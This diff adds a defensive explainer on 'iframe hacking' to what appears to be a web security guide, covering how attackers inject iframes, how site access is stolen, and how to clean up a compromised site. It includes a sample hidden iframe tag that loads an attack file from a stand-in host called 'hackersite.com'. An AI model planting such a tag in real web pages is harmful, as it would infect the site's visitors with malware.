@@ -362,3 +362,49 @@ used for Clickjacking Protection.
 
 - MSDN article [About Cross-Frame Scripting and Security](http://msdn.microsoft.com/en-us/library/ms533028%28VS.85%29.aspx)
 - iDefense Labs advisory [Microsoft Internet Explorer Cross Frame Scripting Restriction Bypass](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=77)
+
+
+Iframe Hacking
+What is IFrame Hacking?
+
+The name Iframe Hacking has been derived from the manner in which the hacking is done using an iframe tag. Iframe is short for inline frame, and is essentially the name of an html tag -<iframe> </iframe>. Iframe tags can be used to insert contents from another website within a web page as if they were part of the current page. While this may be useful for building user-friendly web applications and for cross-site scripting purposes, hackers misuse this feature to insert contents from their own malicious website.
+
+In an IFrame attack, the hacker embeds a malicious iframe code snippet in your website page. When anyone visits that page, the hidden iframe code secretly downloads and installs a Trojan or a malware such as key-logger on the unsuspecting user's computer, if his computer is not adequately protected. Thus over a short period of time several of your site visitors' computers would get infected. Very soon your website will get known as a source of virus and may get blacklisted from the internet community. Even search engines will ban your website, causing severe damage to your reputation and business.
+
+Below is an example of a hidden iframe code embed in a web page:
+<iframe src="http://hackersite.com/attackfile.php" width=100% height=0></iframe>
+
+Gumblar attack is an example of this type of iframe hacking.
+
+Some iframe hackers may not cause real damage to your website or site visitors but may simply embed an iframe code to display an Ad, taking advantage of your website traffic, or may simply direct your site visitors to his own site with the objective to increase his own site's traffic with an aim to improve his own site's search engine rank. Some SEO experts may adopt this unscrupulous technique to drive traffic to their own client's websites to build traffic for their clients.
+
+Below is an example of a visible iframe code embed that may be used to display an Ad:
+<iframe src="http://hackersite.com/ad.jpg" width=200 height=150></iframe>
+
+How do Hackers gain access to your website?
+
+If your website is hacked it does not mean your hosting server is lacking on the security side. Most iframe hacking happens on websites whose owners are accessing their hosting account from an insecure computer. If your computer is infected with a key-logger malware, the moment you login to your website hosting account, the malware secretly passes your account login credentials to the hacker. The hacker then logs into your hosting account as a legitimate user and modifies your website html pages to embed the malicious iframe code.
+
+Iframe code injection can also take place in a code driven website that may be using PHP/ASP for handling forms. If the handler codes are not securely designed it may allow for code injection via SQL injection. Read more about SQL injection.
+
+How to protect your website from iframe hacking?
+
+FTP Account: If you use FTP, you are in danger of exposing your passwords to hackers because the passwords are passed between your FTP client and your website in plain text. Use a program like WinSCP, or an FTP client that allows you to connect to your site using secure SFTP or SCP. Both of these methods encrypt your user name and password, making it much more difficult for a hacker to discover them, even if they intercept them with some sort of packet sniffer.
+
+Hosting Control Panel: Whenever you log into your hosting control panel always use a secure SSL port to login. Keep your passwords difficult to guess. Use a password generator to generate your passwords. Never use the same password to log into different sites or control panels. Change your passwords more frequently.
+
+Infected Computer: If you personal computer system is infected with Virus/Trojan/Spyware then there is a chance that the hacker gained access to your login credentials when you logged into your website hosting account. It is advisable to install a good anti-virus software on your computer and keep it always updated.
+
+XSS (Cross Site Scripting) vulnerability in your website: If your site has XSS vulnerability then there is a high risk for such type of hacking.
+
+SQL Injection: If your site is not designed to prevent SQL injection then hacker can easily get to access your database and insert malicious code.
+
+What to do if your website has been attacked with iframe hacking?
+
+    Immediately gain access to a secure computer and login to your hosting account control panel from there. Change your hosting control panel password as well as all your ftp passwords.
+    Download your entire website files in the local computer. Open each and every web page file in a text editor (image files are not affected) and check for presence of any code snippet that should not have been there, and remove it. Only scanning for presence of <iframe> tag will not help, as some hackers resort to code obfuscation and embed obfuscated code.
+    After you have ensured that all your website files are now clean, delete all files on the server and upload the cleaned files from your local computer.
+    Also, inform your hosting provider that your website was iframe hacked so that they can do necessary checks from their end too.
+    Clean the infected computer that you had been using earlier to access your hosting account. It would be better to re-format the entire hard disk and then install a good anti-virus software, so that you are protected in future.
+    Never login to your hosting account from an untrusted computer.
+
